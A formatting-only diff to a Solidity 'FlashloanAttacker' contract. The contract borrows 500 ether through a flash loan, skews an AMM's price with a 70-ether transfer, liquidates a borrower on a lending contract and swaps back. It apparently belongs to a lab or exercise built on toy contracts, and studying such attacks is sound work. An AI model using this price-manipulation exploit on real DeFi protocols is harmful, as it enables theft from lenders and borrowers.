@@ -8,9 +8,7 @@ import "./Lending.sol";
 import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
-
 contract FlashloanAttacker is IERC3156FlashBorrower {
-
     AMM public amm;
     Lending public lending;
     FlashLender public flashLender;
@@ -22,7 +20,7 @@ contract FlashloanAttacker is IERC3156FlashBorrower {
         uint256 borrowedAmount;
     }
 
-    constructor(address payable _amm, address payable _lending, address payable  _flashLender, address _borrower) {
+    constructor(address payable _amm, address payable _lending, address payable _flashLender, address _borrower) {
         amm = AMM(_amm);
         lending = Lending(_lending);
         flashLender = FlashLender(_flashLender);
@@ -32,25 +30,20 @@ contract FlashloanAttacker is IERC3156FlashBorrower {
 
     function attack() public {
         flashLender.flashLoan(IERC3156FlashBorrower(address(this)), address(amm.lendToken()), 500 ether, "");
-
     }
 
-    function onFlashLoan(
-        address initiator,
-        address token,
-        uint256 amount,
-        uint256 fee,
-        bytes calldata data
-    ) external returns (bytes32) {
-
-        require(IERC20(token).transfer(address(amm), 70 ether),"transfer failed in attack");
+    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
+        external
+        returns (bytes32)
+    {
+        require(IERC20(token).transfer(address(amm), 70 ether), "transfer failed in attack");
 
         uint256 oldBalance = address(this).balance;
         amm.swapLendTokenForEth(address(this));
         lending.liquidate(borrower);
 
         uint256 ethAmount = address(this).balance - oldBalance;
-        (bool success, ) = payable(address(amm)).call{value: ethAmount}("");
+        (bool success,) = payable(address(amm)).call{value: ethAmount}("");
         require(success);
         amm.swapEthForLendToken(address(this));
 
@@ -60,6 +53,5 @@ contract FlashloanAttacker is IERC3156FlashBorrower {
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 
-    receive() payable external {
-    }
+    receive() external payable {}
 }
